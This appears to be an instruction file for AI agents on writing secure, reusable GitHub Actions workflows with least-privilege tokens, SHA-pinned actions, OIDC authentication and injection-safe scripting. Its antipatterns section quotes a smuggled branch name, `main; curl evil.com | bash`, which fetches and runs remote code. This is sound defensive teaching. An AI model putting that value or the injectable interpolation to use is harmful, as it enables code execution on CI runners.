---
name: "secure-reusable-workflows"
description: "Authoring secure, modular GitHub Actions workflows utilizing `workflow_call`, explicit least-privilege permissions, commit SHA pinning, and OIDC cloud authentication."
category: "devops"
subcategory: "github-actions"
language: "yaml"
framework: "github-actions"
technology: "github-actions"
difficulty: "advanced"
tags: ["devops", "github-actions", "security", "oidc", "reusable-workflows", "least-privilege"]
---

# Secure Reusable GitHub Actions and Supply Chain Security

## Purpose
Instruct AI agents to author enterprise-grade GitHub Actions workflows that prevent supply chain attacks, enforce minimal GITHUB_TOKEN permissions, and eliminate static cloud credentials.

## When to Use
Use when standardizing CI/CD workflows across multiple repositories, creating reusable workflow templates, or securing GitHub Actions pipelines against supply chain threats.

## Inputs / Context
Workflow triggers, required inputs/secrets, cloud provider integration (AWS/GCP/Azure), and target branch protections.

## Instructions
1. Enforce Principle of Least Privilege on `GITHUB_TOKEN`:
   - Always declare top-level `permissions: {}` (default to read-only or no permissions).
   - Explicitly grant minimal permissions required per job (e.g., `permissions: { contents: read, pull-requests: write }`).
2. Pin Third-Party Actions to Full Immutable Commit SHAs:
   - Never use mutable tags like `uses: actions/checkout@v4` or `@main` in security-critical environments; compromised tags allow supply chain attacks.
   - Use full 40-character commit SHAs with a descriptive comment: `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1`.
3. Eliminate Long-Lived Static Cloud Secrets using OIDC:
   - Never store long-lived AWS Access Keys or GCP service account JSON in repository secrets.
   - Use OpenID Connect (OIDC) with `permissions: { id-token: write, contents: read }` to assume temporary, scoped cloud IAM roles dynamically.
4. Architect Modular Reusable Workflows (`workflow_call`):
   - Define shared CI/CD pipelines in `.github/workflows/reusable-*.yml` triggered via `on: workflow_call`.
   - Explicitly declare typed `inputs` (string, boolean) and `secrets` (inherited or named).
5. Guard Against Script Injection:
   - Never interpolate untrusted user inputs (like PR titles, commit messages, or issue bodies) directly into `run:` shell commands (e.g., `run: echo "${{ github.event.issue.title }}"` is a severe injection vulnerability).
   - Pass untrusted values safely via intermediate environment variables: `env: { TITLE: ${{ github.event.issue.title }} } run: echo "$TITLE"`.

## Constraints / Rules
- Never grant `permissions: write-all` on GitHub Actions workflows.
- Never interpolate GitHub context expressions (`${{ github.event... }}`) directly into inline bash scripts.
- Do not store permanent cloud administrator credentials in repository secrets.

## Workflow
1. Define top-level minimal permissions.
2. Structure reusable workflow with `workflow_call` trigger and typed inputs.
3. Pin all third-party actions to 40-character commit SHAs.
4. Configure OIDC role assumption for cloud deployments.
5. Pass dynamic context into scripts strictly through environment variables.

## Expected Output
Secure, reusable GitHub Actions workflow YAML featuring commit SHA pinning, OIDC authentication, and zero script injection vectors.

## Validation Checklist
- [ ] Are permissions explicitly declared and scoped to least privilege?
- [ ] Are external actions pinned to 40-character commit SHAs?
- [ ] Is cloud authentication handled via short-lived OIDC tokens?
- [ ] Are context variables passed via `env` blocks rather than inline script interpolation?
- [ ] Is the workflow parameterized for reuse via `workflow_call`?

## Common Mistakes & Antipatterns
- Writing `run: echo "Processing branch ${{ github.head_ref }}"`, allowing an attacker to submit a PR with a branch named `main; curl evil.com | bash` and achieve remote code execution.
- Storing permanent AWS root credentials in GitHub Secrets that never expire or rotate.
- Allowing all jobs to inherit default unrestricted read/write permissions on the repository.

## Concrete Real-World Example
Scenario: A team's deploy workflow interpolates the commit message directly into a bash command and uses permanent AWS access keys.
Prompt: Secure this GitHub Actions deployment workflow against script injection and migrate to OIDC.
Application: The AI declares `permissions: { id-token: write, contents: read }`, replaces static AWS keys with `aws-actions/configure-aws-credentials` using OIDC role assumption, pins actions to commit SHAs, and moves commit messages into an `env` block before echoing.
